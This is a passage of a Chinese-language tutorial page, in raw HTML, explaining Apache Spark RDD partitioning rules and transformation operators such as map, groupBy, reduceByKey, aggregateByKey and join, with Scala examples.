punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>foreach<span class="token punctuation">(</span>println<span class="token punctuation">)</span>sparkContext<span class="token punctuation">.</span>stop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>l 读取内存数据时，数据可以按照并行度的设定进行数据的分区操作，数据分区规则的Spark核心源码如下：</p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">def</span> positions<span class="token punctuation">(</span>length<span class="token operator">:</span> <span class="token builtin">Long</span><span class="token punctuation">,</span> numSlices<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span><span class="token operator">:</span> Iterator<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token builtin">Int</span><span class="token punctuation">,</span> <span class="token builtin">Int</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token punctuation">(</span><span class="token number">0</span> until numSlices<span class="token punctuation">)</span><span class="token punctuation">.</span>iterator<span class="token punctuation">.</span>map <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span> i <span class="token keyword">=></span>    <span class="token keyword">val</span> start <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">*</span> length<span class="token punctuation">)</span> <span class="token operator">/</span> numSlices<span class="token punctuation">)</span><span class="token punctuation">.</span>toInt    <span class="token keyword">val</span> end <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> length<span class="token punctuation">)</span> <span class="token operator">/</span> numSlices<span class="token punctuation">)</span><span class="token punctuation">.</span>toInt    <span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>l 读取文件数据时，数据是按照Hadoop文件读取的规则进行切片分区，而切片规则和数据读取的规则有些差异，具体Spark核心源码如下</p><pre class="line-numbers language-scala"><code class="language-scala">public InputSplit<span class="token punctuation">[</span><span class="token punctuation">]</span> getSplits<span class="token punctuation">(</span>JobConf job<span class="token punctuation">,</span> int numSplits<span class="token punctuation">)</span>    throws IOException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    long totalSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                           <span class="token comment" spellcheck="true">// compute total size</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>FileStatus file<span class="token operator">:</span> files<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// check we have valid files</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>file<span class="token punctuation">.</span>isDirectory<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> IOException<span class="token punctuation">(</span><span class="token string">"Not a file: "</span><span class="token operator">+</span> file<span class="token punctuation">.</span>getPath<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>      totalSize <span class="token operator">+=</span> file<span class="token punctuation">.</span>getLen<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    long goalSize <span class="token operator">=</span> totalSize <span class="token operator">/</span> <span class="token punctuation">(</span>numSplits <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> numSplits<span class="token punctuation">)</span><span class="token punctuation">;</span>    long minSize <span class="token operator">=</span> Math<span class="token punctuation">.</span>max<span class="token punctuation">(</span>job<span class="token punctuation">.</span>getLong<span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>input<span class="token punctuation">.</span>      FileInputFormat<span class="token punctuation">.</span>SPLIT_MINSIZE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> minSplitSize<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>FileStatus file<span class="token operator">:</span> files<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>isSplitable<span class="token punctuation">(</span>fs<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>          long blockSize <span class="token operator">=</span> file<span class="token punctuation">.</span>getBlockSize<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          long splitSize <span class="token operator">=</span> computeSplitSize<span class="token punctuation">(</span>goalSize<span class="token punctuation">,</span> minSize<span class="token punctuation">,</span> blockSize<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token keyword">protected</span> long computeSplitSize<span class="token punctuation">(</span>long goalSize<span class="token punctuation">,</span> long minSize<span class="token punctuation">,</span>                                       long blockSize<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> Math<span class="token punctuation">.</span>max<span class="token punctuation">(</span>minSize<span class="token punctuation">,</span> Math<span class="token punctuation">.</span>min<span class="token punctuation">(</span>goalSize<span class="token punctuation">,</span> blockSize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-1-4-3-RDD转换算子"><a href="#2-1-4-3-RDD转换算子" class="headerlink" title="2.1.4.3 RDD转换算子"></a>2.1.4.3 RDD转换算子</h4><p>RDD根据数据处理方式的不同将算子整体上分为Value类型、双Value类型和Key-Value类型</p><p><strong>l Value类型</strong></p><h5 id="1-map"><a href="#1-map" class="headerlink" title="1)   map"></a>1)   map</h5><p>Ø 函数签名</p><p>def map[U: ClassTag](f: T =&gt; U): RDD[U]</p><p>Ø 函数说明</p><p>将处理的数据逐条进行映射转换，这里的转换可以是类型的转换，也可以是值的转换。</p><p>val dataRDD: RDD[Int] = sparkContext.makeRDD(List(1,2,3,4))</p><p>val dataRDD1: RDD[Int] = dataRDD.map(</p><p>  num =&gt; {</p><p>​    num * 2</p><p>  }</p><p>)</p><p>val dataRDD2: RDD[String] = dataRDD1.map(</p><p>  num =&gt; {</p><p>​    “” + num</p><p>  }</p><p>)</p><p>v 小功能：从服务器日志数据apache.log中获取用户请求URL资源路径</p><h5 id="2-mapPartitions"><a href="#2-mapPartitions" class="headerlink" title="2)   mapPartitions"></a>2)   mapPartitions</h5><p>Ø 函数签名</p><p>def mapPartitions[U: ClassTag](</p><p>  f: Iterator[T] =&gt; Iterator[U],</p><p>  preservesPartitioning: Boolean = false): RDD[U]</p><p>Ø 函数说明</p><p>将待处理的数据以分区为单位发送到计算节点进行处理，这里的处理是指可以进行任意的处理，哪怕是过滤数据。</p><p>val dataRDD1: RDD[Int] = dataRDD.mapPartitions(</p><p>  datas =&gt; {</p><p>​    datas.filter(_==2)</p><p>  }</p><p>)</p><p>v 小功能：获取每个数据分区的最大值</p><p><img src="/2020/11/29/bigdata-Spark2-framework/clip_image106.jpg" alt="img"> 思考一个问题：map和mapPartitions的区别？</p><p>Ø 数据处理角度</p><p>Map算子是分区内一个数据一个数据的执行，类似于串行操作。而mapPartitions算子是以分区为单位进行批处理操作。</p><p>Ø 功能的角度</p><p>Map算子主要目的将数据源中的数据进行转换和改变。但是不会减少或增多数据。MapPartitions算子需要传递一个迭代器，返回一个迭代器，没有要求的元素的个数保持不变，所以可以增加或减少数据</p><p>Ø 性能的角度</p><p>Map算子因为类似于串行操作，所以性能比较低，而是mapPartitions算子类似于批处理，所以性能较高。但是mapPartitions算子会长时间占用内存，那么这样会导致内存可能不够用，出现内存溢出的错误。所以在内存有限的情况下，不推荐使用。使用map操作。</p><p>完成比完美更重要</p><h5 id="3-mapPartitionsWithIndex"><a href="#3-mapPartitionsWithIndex" class="headerlink" title="3)   mapPartitionsWithIndex"></a>3)   mapPartitionsWithIndex</h5><p>Ø 函数签名</p><p>def mapPartitionsWithIndex[U: ClassTag](</p><p> f: (Int, Iterator[T]) =&gt; Iterator[U],</p><p> preservesPartitioning: Boolean = false): RDD[U]</p><p>Ø 函数说明</p><p>将待处理的数据以分区为单位发送到计算节点进行处理，这里的处理是指可以进行任意的处理，哪怕是过滤数据，在处理时同时可以获取当前分区索引。</p><p>val dataRDD1 = dataRDD.mapPartitionsWithIndex(</p><p>  (index, datas) =&gt; {</p><p>​     datas.map(index, _)</p><p>  }</p><p>)</p><p>v 小功能：获取第二个数据分区的数据</p><h5 id="4-flatMap"><a href="#4-flatMap" class="headerlink" title="4)   flatMap"></a>4)   flatMap</h5><p>Ø 函数签名</p><p>def flatMap[U: ClassTag](f: T =&gt; TraversableOnce[U]): RDD[U]</p><p>Ø 函数说明</p><p>将处理的数据进行扁平化后再进行映射处理，所以算子也称之为扁平映射</p><p>val dataRDD = sparkContext.makeRDD(List(</p><p>  List(1,2),List(3,4)</p><p>),1)</p><p>val dataRDD1 = dataRDD.flatMap(</p><p>  list =&gt; list</p><p>)</p><p>v 小功能：将List(List(1,2),3,List(4,5))进行扁平化操作</p><h5 id="5-glom"><a href="#5-glom" class="headerlink" title="5)   glom"></a>5)   glom</h5><p>Ø 函数签名</p><p>def glom(): RDD[Array[T]]</p><p>Ø 函数说明</p><p>将同一个分区的数据直接转换为相同类型的内存数组进行处理，分区不变</p><p>val dataRDD = sparkContext.makeRDD(List(</p><p>  1,2,3,4</p><p>),1)</p><p>val dataRDD1:RDD[Array[Int]] = dataRDD.glom()</p><p>v 小功能：计算所有分区最大值求和（分区内取最大值，分区间最大值求和）</p><h5 id="6-groupBy"><a href="#6-groupBy" class="headerlink" title="6)   groupBy"></a>6)   groupBy</h5><p>Ø 函数签名</p><p>def groupBy[K](f: T =&gt; K)(implicit kt: ClassTag[K]): RDD[(K, Iterable[T])]</p><p>Ø 函数说明</p><p>将数据根据指定的规则进行分组, 分区默认不变，但是数据会被打乱重新组合，我们将这样的操作称之为shuffle。极限情况下，数据可能被分在同一个分区中</p><p>一个组的数据在一个分区中，但是并不是说一个分区中只有一个组</p><p>val dataRDD = sparkContext.makeRDD(List(1,2,3,4),1)</p><p>val dataRDD1 = dataRDD.groupBy(</p><p>  _%2</p><p>)</p><p>v 小功能：将List(“Hello”, “hive”, “hbase”, “Hadoop”)根据单词首写字母进行分组。</p><p>v 小功能：从服务器日志数据apache.log中获取每个时间段访问量。</p><p>v 小功能：WordCount。</p><h5 id="7-filter"><a href="#7-filter" class="headerlink" title="7)   filter"></a>7)   filter</h5><p>Ø 函数签名</p><p>def filter(f: T =&gt; Boolean): RDD[T]</p><p>Ø 函数说明</p><p>将数据根据指定的规则进行筛选过滤，符合规则的数据保留，不符合规则的数据丢弃。</p><p>当数据进行筛选过滤后，分区不变，但是分区内的数据可能不均衡，生产环境下，可能会出现数据倾斜。</p><p>val dataRDD = sparkContext.makeRDD(List(</p><p>  1,2,3,4</p><p>),1)</p><p>val dataRDD1 = dataRDD.filter(_%2 == 0)</p><p>v 小功能：从服务器日志数据apache.log中获取2015年5月17日的请求路径</p><h5 id="8-sample"><a href="#8-sample" class="headerlink" title="8)   sample"></a>8)   sample</h5><p>Ø 函数签名</p><p>def sample(</p><p> withReplacement: Boolean,</p><p> fraction: Double,</p><p> seed: Long = Utils.random.nextLong): RDD[T]</p><p>Ø 函数说明</p><p>根据指定的规则从数据集中抽取数据</p><p>val dataRDD = sparkContext.makeRDD(List(</p><p>  1,2,3,4</p><p>),1)</p><p>// 抽取数据不放回（伯努利算法）</p><p>// 伯努利算法：又叫0、1分布。例如扔硬币，要么正面，要么反面。</p><p>// 具体实现：根据种子和随机算法算出一个数和第二个参数设置几率比较，小于第二个参数要，大于不要</p><p>// 第一个参数：抽取的数据是否放回，false：不放回</p><p>// 第二个参数：抽取的几率，范围在[0,1]之间,0：全不取；1：全取；</p><p>// 第三个参数：随机数种子</p><p>val dataRDD1 = dataRDD.sample(false, 0.5)</p><p>// 抽取数据放回（泊松算法）</p><p>// 第一个参数：抽取的数据是否放回，true：放回；false：不放回</p><p>// 第二个参数：重复数据的几率，范围大于等于0.表示每一个元素被期望抽取到的次数</p><p>// 第三个参数：随机数种子</p><p>val dataRDD2 = dataRDD.sample(true, 2)</p><p><img src="/2020/11/29/bigdata-Spark2-framework/clip_image107.jpg" alt="img">思考一个问题：有啥用，抽奖吗？</p><h5 id="9-distinct"><a href="#9-distinct" class="headerlink" title="9)   distinct"></a>9)   distinct</h5><p>Ø 函数签名</p><p>def distinct()(implicit ord: Ordering[T] = null): RDD[T]</p><p>def distinct(numPartitions: Int)(implicit ord: Ordering[T] = null): RDD[T]</p><p>Ø 函数说明</p><p>将数据集中重复的数据去重</p><p>val dataRDD = sparkContext.makeRDD(List(</p><p>  1,2,3,4,1,2</p><p>),1)</p><p>val dataRDD1 = dataRDD.distinct()</p><p>val dataRDD2 = dataRDD.distinct(2)</p><p><img src="/2020/11/29/bigdata-Spark2-framework/clip_image108.jpg" alt="img">思考一个问题：如果不用该算子，你有什么办法实现数据去重？</p><h5 id="10-coalesce"><a href="#10-coalesce" class="headerlink" title="10)  coalesce"></a>10)  coalesce</h5><p>Ø 函数签名</p><p>def coalesce(numPartitions: Int, shuffle: Boolean = false,</p><p>​      partitionCoalescer: Option[PartitionCoalescer] = Option.empty)</p><p>​     (implicit ord: Ordering[T] = null)</p><p> : RDD[T]</p><p>Ø 函数说明</p><p>根据数据量缩减分区，用于大数据集过滤后，提高小数据集的执行效率</p><p>当spark程序中，存在过多的小任务的时候，可以通过coalesce方法，收缩合并分区，减少分区的个数，减小任务调度成本</p><p>val dataRDD = sparkContext.makeRDD(List(</p><p>  1,2,3,4,1,2</p><p>),6)</p><p>val dataRDD1 = dataRDD.coalesce(2)</p><p><img src="file:///C:/Users/MENGLI~1.ZHA/AppData/Local/Temp/msohtmlclip1/01/clip_image106.jpg" alt="img">思考一个问题：我想要扩大分区，怎么办？</p><h5 id="11-repartition"><a href="#11-repartition" class="headerlink" title="11)  repartition"></a>11)  repartition</h5><p>Ø 函数签名</p><p>def repartition(numPartitions: Int)(implicit ord: Ordering[T] = null): RDD[T]</p><p>Ø 函数说明</p><p>该操作内部其实执行的是coalesce操作，参数shuffle的默认值为true。无论是将分区数多的RDD转换为分区数少的RDD，还是将分区数少的RDD转换为分区数多的RDD，repartition操作都可以完成，因为无论如何都会经shuffle过程。</p><p>val dataRDD = sparkContext.makeRDD(List(</p><p>  1,2,3,4,1,2</p><p>),2)</p><p>val dataRDD1 = dataRDD.repartition(4)</p><p>思考一个问题：coalesce和repartition区别？</p><h5 id="12-sortBy"><a href="#12-sortBy" class="headerlink" title="12)  sortBy"></a>12)  sortBy</h5><p>Ø 函数签名</p><p>def sortBy[K](</p><p> f: (T) =&gt; K,</p><p> ascending: Boolean = true,</p><p> numPartitions: Int = this.partitions.length)</p><p> (implicit ord: Ordering[K], ctag: ClassTag[K]): RDD[T]</p><p>Ø 函数说明</p><p>该操作用于排序数据。在排序之前，可以将数据通过f函数进行处理，之后按照f函数处理的结果进行排序，默认为升序排列。排序后新产生的RDD的分区数与原RDD的分区数一致。中间存在shuffle的过程</p><p>val dataRDD = sparkContext.makeRDD(List(</p><p>  1,2,3,4,1,2</p><p>),2)</p><p>val dataRDD1 = dataRDD.sortBy(num=&gt;num, false, 4)</p><p>l 双Value类型</p><h5 id="13-intersection"><a href="#13-intersection" class="headerlink" title="13)  intersection"></a>13)  intersection</h5><p>Ø 函数签名</p><p>def intersection(other: RDD[T]): RDD[T]</p><p>Ø 函数说明</p><p>对源RDD和参数RDD求交集后返回一个新的RDD</p><p>val dataRDD1 = sparkContext.makeRDD(List(1,2,3,4))</p><p>val dataRDD2 = sparkContext.makeRDD(List(3,4,5,6))</p><p>val dataRDD = dataRDD1.intersection(dataRDD2)</p><p><img src="/2020/11/29/bigdata-Spark2-framework/clip_image110.jpg" alt="img">思考一个问题：如果两个RDD数据类型不一致怎么办？</p><h5 id="14-union"><a href="#14-union" class="headerlink" title="14)  union"></a>14)  union</h5><p>Ø 函数签名</p><p>def union(other: RDD[T]): RDD[T]</p><p>Ø 函数说明</p><p>对源RDD和参数RDD求并集后返回一个新的RDD</p><p>val dataRDD1 = sparkContext.makeRDD(List(1,2,3,4))</p><p>val dataRDD2 = sparkContext.makeRDD(List(3,4,5,6))</p><p>val dataRDD = dataRDD1.union(dataRDD2)</p><p><img src="file:///C:/Users/MENGLI~1.ZHA/AppData/Local/Temp/msohtmlclip1/01/clip_image106.jpg" alt="img">思考一个问题：如果两个RDD数据类型不一致怎么办？</p><h5 id="15-subtract"><a href="#15-subtract" class="headerlink" title="15)  subtract"></a>15)  subtract</h5><p>Ø 函数签名</p><p>def subtract(other: RDD[T]): RDD[T]</p><p>Ø 函数说明</p><p>以一个RDD元素为主，去除两个RDD中重复元素，将其他元素保留下来。求差集</p><p>val dataRDD1 = sparkContext.makeRDD(List(1,2,3,4))</p><p>val dataRDD2 = sparkContext.makeRDD(List(3,4,5,6))</p><p>val dataRDD = dataRDD1.subtract(dataRDD2)</p><p>思考一个问题：如果两个RDD数据类型不一致怎么办？</p><h5 id="16-zip"><a href="#16-zip" class="headerlink" title="16)  zip"></a>16)  zip</h5><p>Ø 函数签名</p><p>def zip[U: ClassTag](other: RDD[U]): RDD[(T, U)]</p><p>Ø 函数说明</p><p>将两个RDD中的元素，以键值对的形式进行合并。其中，键值对中的Key为第1个RDD中的元素，Value为第2个RDD中的相同位置的元素。</p><p>val dataRDD1 = sparkContext.makeRDD(List(1,2,3,4))</p><p>val dataRDD2 = sparkContext.makeRDD(List(3,4,5,6))</p><p>val dataRDD = dataRDD1.zip(dataRDD2)</p><p><img src="file:///C:/Users/MENGLI~1.ZHA/AppData/Local/Temp/msohtmlclip1/01/clip_image110.jpg" alt="img">思考一个问题：如果两个RDD数据类型不一致怎么办？</p><p><img src="file:///C:/Users/MENGLI~1.ZHA/AppData/Local/Temp/msohtmlclip1/01/clip_image110.jpg" alt="img">思考一个问题：如果两个RDD数据分区不一致怎么办？</p><p><img src="file:///C:/Users/MENGLI~1.ZHA/AppData/Local/Temp/msohtmlclip1/01/clip_image110.jpg" alt="img">思考一个问题：如果两个RDD分区数据数量不一致怎么办？</p><p>l Key - Value类型</p><h5 id="17-partitionBy"><a href="#17-partitionBy" class="headerlink" title="17)  partitionBy"></a>17)  partitionBy</h5><p>Ø 函数签名</p><p>def partitionBy(partitioner: Partitioner): RDD[(K, V)]</p><p>Ø 函数说明</p><p>将数据按照指定Partitioner重新进行分区。Spark默认的分区器是HashPartitioner</p><p>val rdd: RDD[(Int, String)] =</p><p>  sc.makeRDD(Array((1,”aaa”),(2,”bbb”),(3,”ccc”)),3)</p><p>import org.apache.spark.HashPartitioner</p><p>val rdd2: RDD[(Int, String)] =</p><p>  rdd.partitionBy(new HashPartitioner(2))</p><p><img src="file:///C:/Users/MENGLI~1.ZHA/AppData/Local/Temp/msohtmlclip1/01/clip_image106.jpg" alt="img">思考一个问题：如果重分区的分区器和当前RDD的分区器一样怎么办？</p><p><img src="file:///C:/Users/MENGLI~1.ZHA/AppData/Local/Temp/msohtmlclip1/01/clip_image106.jpg" alt="img">思考一个问题：Spark还有其他分区器吗？</p><p><img src="file:///C:/Users/MENGLI~1.ZHA/AppData/Local/Temp/msohtmlclip1/01/clip_image110.jpg" alt="img">思考一个问题：如果想按照自己的方法进行数据分区怎么办？</p><p><img src="file:///C:/Users/MENGLI~1.ZHA/AppData/Local/Temp/msohtmlclip1/01/clip_image110.jpg" alt="img">思考一个问题：哪那么多问题？</p><h5 id="18-reduceByKey"><a href="#18-reduceByKey" class="headerlink" title="18)  reduceByKey"></a>18)  reduceByKey</h5><p>Ø 函数签名</p><p>def reduceByKey(func: (V, V) =&gt; V): RDD[(K, V)]</p><p>def reduceByKey(func: (V, V) =&gt; V, numPartitions: Int): RDD[(K, V)]</p><p>Ø 函数说明</p><p>可以将数据按照相同的Key对Value进行聚合</p><p>val dataRDD1 = sparkContext.makeRDD(List((“a”,1),(“b”,2),(“c”,3)))</p><p>val dataRDD2 = dataRDD1.reduceByKey(<em>+</em>)</p><p>val dataRDD3 = dataRDD1.reduceByKey(<em>+</em>, 2)</p><p>v 小功能：WordCount</p><h5 id="19-groupByKey"><a href="#19-groupByKey" class="headerlink" title="19)  groupByKey"></a>19)  groupByKey</h5><p>Ø 函数签名</p><p>def groupByKey(): RDD[(K, Iterable[V])]</p><p>def groupByKey(numPartitions: Int): RDD[(K, Iterable[V])]</p><p>def groupByKey(partitioner: Partitioner): RDD[(K, Iterable[V])]</p><p>Ø 函数说明</p><p>将数据源的数据根据key对value进行分组</p><p>val dataRDD1 =</p><p>  sparkContext.makeRDD(List((“a”,1),(“b”,2),(“c”,3)))</p><p>val dataRDD2 = dataRDD1.groupByKey()</p><p>val dataRDD3 = dataRDD1.groupByKey(2)</p><p>val dataRDD4 = dataRDD1.groupByKey(new HashPartitioner(2))</p><p>考一个问题：reduceByKey和groupByKey的区别？</p><p>从shuffle的角度：reduceByKey和groupByKey都存在shuffle的操作，但是reduceByKey可以在shuffle前对分区内相同key的数据进行预聚合（combine）功能，这样会减少落盘的数据量，而groupByKey只是进行分组，不存在数据量减少的问题，reduceByKey性能比较高。</p><p>从功能的角度：reduceByKey其实包含分组和聚合的功能。groupByKey只能分组，不能聚合，所以在分组聚合的场合下，推荐使用reduceByKey，如果仅仅是分组而不需要聚合。那么还是只能使用groupByKey</p><p>v 小功能：WordCount</p><h5 id="20-aggregateByKey"><a href="#20-aggregateByKey" class="headerlink" title="20)  aggregateByKey"></a>20)  aggregateByKey</h5><p>Ø 函数签名</p><p>def aggregateByKey[U: ClassTag](zeroValue: U)(seqOp: (U, V) =&gt; U,</p><p> combOp: (U, U) =&gt; U): RDD[(K, U)]</p><p>Ø 函数说明</p><p>将数据根据不同的规则进行分区内计算和分区间计算</p><p>val dataRDD1 =</p><p>  sparkContext.makeRDD(List((“a”,1),(“b”,2),(“c”,3)))</p><p>val dataRDD2 =</p><p>  dataRDD1.aggregateByKey(0)(<em>+</em>,<em>+</em>)</p><p>v 取出每个分区内相同key的最大值然后分区间相加</p><p>// TODO : 取出每个分区内相同key的最大值然后分区间相加</p><p>// aggregateByKey算子是函数柯里化，存在两个参数列表</p><p>// 1. 第一个参数列表中的参数表示初始值</p><p>// 2. 第二个参数列表中含有两个参数</p><p>//  2.1 第一个参数表示分区内的计算规则</p><p>//  2.2 第二个参数表示分区间的计算规则</p><p>val rdd =</p><p>  sc.makeRDD(List(</p><p>​    (“a”,1),(“a”,2),(“c”,3),</p><p>​    (“b”,4),(“c”,5),(“c”,6)</p><p>  ),2)</p><p>// 0:(“a”,1),(“a”,2),(“c”,3) =&gt; (a,10)(c,10)</p><p>//                     =&gt; (a,10)(b,10)(c,20)</p><p>// 1:(“b”,4),(“c”,5),(“c”,6) =&gt; (b,10)(c,10)</p><p>val resultRDD =</p><p>  rdd.aggregateByKey(10)(</p><p>​    (x, y) =&gt; math.max(x,y),</p><p>​    (x, y) =&gt; x + y</p><p>  )</p><p>resultRDD.collect().foreach(println)</p><p><img src="file:///C:/Users/MENGLI~1.ZHA/AppData/Local/Temp/msohtmlclip1/01/clip_image106.jpg" alt="img">思考一个问题：分区内计算规则和分区间计算规则相同怎么办？（WordCount）</p><h5 id="21-foldByKey"><a href="#21-foldByKey" class="headerlink" title="21)  foldByKey"></a>21)  foldByKey</h5><p>Ø 函数签名</p><p>def foldByKey(zeroValue: V)(func: (V, V) =&gt; V): RDD[(K, V)]</p><p>Ø 函数说明</p><p>当分区内计算规则和分区间计算规则相同时，aggregateByKey就可以简化为foldByKey</p><p>val dataRDD1 = sparkContext.makeRDD(List((“a”,1),(“b”,2),(“c”,3)))</p><p>val dataRDD2 = dataRDD1.foldByKey(0)(<em>+</em>)</p><h5 id="22-combineByKey"><a href="#22-combineByKey" class="headerlink" title="22)  combineByKey"></a>22)  combineByKey</h5><p>Ø 函数签名</p><p>def combineByKey[C](</p><p> createCombiner: V =&gt; C,</p><p> mergeValue: (C, V) =&gt; C,</p><p> mergeCombiners: (C, C) =&gt; C): RDD[(K, C)]</p><p>Ø 函数说明</p><p>最通用的对key-value型rdd进行聚集操作的聚集函数（aggregation function）。类似于aggregate()，combineByKey()允许用户返回值的类型与输入不一致。</p><p>小练习：将数据List((“a”, 88), (“b”, 95), (“a”, 91), (“b”, 93), (“a”, 95), (“b”, 98))求每个key的平均值</p><p>val list: List[(String, Int)] = List((“a”, 88), (“b”, 95), (“a”, 91), (“b”, 93), (“a”, 95), (“b”, 98))</p><p>val input: RDD[(String, Int)] = sc.makeRDD(list, 2)</p><p>val combineRdd: RDD[(String, (Int, Int))] = input.combineByKey(</p><p>  (_, 1),</p><p>  (acc: (Int, Int), v) =&gt; (acc._1 + v, acc._2 + 1),</p><p>  (acc1: (Int, Int), acc2: (Int, Int)) =&gt; (acc1._1 + acc2._1, acc1._2 + acc2._2)</p><p>)</p><p><img src="/2020/11/29/bigdata-Spark2-framework/clip_image112.jpg" alt="img">思考一个问题：reduceByKey、foldByKey、aggregateByKey、combineByKey的区别？</p><p>reduceByKey: 相同key的第一个数据不进行任何计算，分区内和分区间计算规则相同</p><p>foldByKey: 相同key的第一个数据和初始值进行分区内计算，分区内和分区间计算规则相同</p><p>aggregateByKey：相同key的第一个数据和初始值进行分区内计算，分区内和分区间计算规则可以不相同</p><p>combineByKey:当计算时，发现数据结构不满足要求时，可以让第一个数据转换结构。分区内和分区间计算规则不相同。</p><h5 id="23-sortByKey"><a href="#23-sortByKey" class="headerlink" title="23)  sortByKey"></a>23)  sortByKey</h5><p>Ø 函数签名</p><p>def sortByKey(ascending: Boolean = true, numPartitions: Int = self.partitions.length)</p><p> : RDD[(K, V)]</p><p>Ø 函数说明</p><p>在一个(K,V)的RDD上调用，K必须实现Ordered接口(特质)，返回一个按照key进行排序的</p><p>val dataRDD1 = sparkContext.makeRDD(List((“a”,1),(“b”,2),(“c”,3)))</p><p>val sortRDD1: RDD[(String, Int)] = dataRDD1.sortByKey(true)</p><p>val sortRDD1: RDD[(String, Int)] = dataRDD1.sortByKey(false)</p><p>v 小功能：设置key为自定义类User</p><h5 id="24-join"><a href="#24-join" class="headerlink" title="24)  join"></a>24)  join</h5><p>Ø 函数签名</p><p>def join[W](other: RDD[(K, W)]): RDD[(K, (V, W))]</p><p>Ø 函数说明</p><p>在类型为(K,V)和(K,W)的RDD上调用，返回一个相同key对应的所有元素连接在一起的(K,(V,W))的RDD</p><p>val rdd: RDD[(Int, String)] = sc.makeRDD(Array((1, “a”), (2, “b”), (3, “c”)))</p><p>val rdd1: RDD[(Int, Int)] = sc.makeRDD(Array((1, 4), (2, 5), (3, 6)))</p><p>rdd.join(rdd1).collect().foreach(println)</p><p><img src="file:///C:/Users/MENGLI~1.ZHA/AppData/Local/Temp/msohtmlclip1/01/clip_image106.jpg" alt="img">思考一个问题：如果key存在不相等呢？</p><h5 id="25-leftOuterJoin"><a href="#25-leftOuterJoin" class="headerlink" title="25)  leftOuterJoin"></a>25)  leftOuterJoin</h5><p>Ø 函数签名</p><p>def leftOuterJoin[W](other: RDD[(K, W)]): RDD[(K, (V, Option[W]))]</p><p>Ø 函数说明</p><p>类似于SQL语句的左外连接</p><p>val dataRDD1 = sparkContext.makeRDD(List((“a”,1),(“b”,2),(“c”,3)))</p><p>val dataRDD2 = sparkContext.makeRDD(List((“a”,1),(“b”,2),(“c”,3)))</p><p>val rdd: RDD[(String, (Int, Option[Int]))] = dataRDD1.leftOuterJoin(dataRDD2)</p><h5 id="26-cogroup"><a href="#26-cogroup" class="headerlink" title="26)  cogroup"></a>26)  cogroup</h5><p>Ø 函数签名</p><p>def cogroup[W](other: RDD[(K, W)]): RDD[(K, (Iterable[V], Iterable[W]))]</p><p>Ø 函数说明</p><p>在类型为(K,V)和(K,W)的RDD上调用，返回一个(K,(Iterable<V>,Iterable<W>))类型的RDD</W></V></p><p>val dataRDD1 = sparkContext.makeRDD(List((“a”,1),(“a”,2),(“c”,3)))</p><p>val dataRDD2 = 